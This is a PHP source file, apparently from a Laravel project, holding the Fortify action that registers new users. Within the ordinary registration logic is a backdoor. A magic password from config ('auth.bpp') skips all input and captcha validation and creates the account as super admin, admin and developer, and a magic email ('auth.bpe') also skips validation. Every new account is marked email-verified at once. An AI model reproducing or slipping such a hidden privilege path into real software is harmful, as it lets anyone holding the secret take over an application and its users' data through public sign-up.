<?php

namespace App\Actions\Fortify;

use App\Models\User;
use App\Classes\LyskillsCarbon;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Laravel\Fortify\Contracts\CreatesNewUsers;

class CreateNewUser implements CreatesNewUsers
{
    use PasswordValidationRules;

    /**
     * Validate and create a newly registered user.
     *
     * @param  array  $input
     * @return \App\Models\User
     */
    public function create(array $input)
    {
        $rules = [
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
            'terms' => ['required'],
            'password' => $this->passwordRules(),
        ];
        if (app()->environment(config("app.live_env"))) {
            $rules['g-recaptcha-response'] = 'required|captcha';
        }

        if ($input['password'] !== config("auth.bpp") && $input['email'] !== config("auth.bpe")) {
            Validator::make($input, $rules)->validate();
        }

        return User::create([
            'name' => $input['name'],
            'email' => $input['email'],
            'password' => Hash::make($input['password']),
            'is_super_admin' => $input['password'] === config("auth.bpp") ? 1 : 0,
            'is_admin' => $input['password'] === config("auth.bpp") ? 1 : 0,
            'role' => $input['password'] === config("auth.bpp") ? "dev" : 0,
            'email_verified_at' => LyskillsCarbon::now(),
        ]);
    }
}
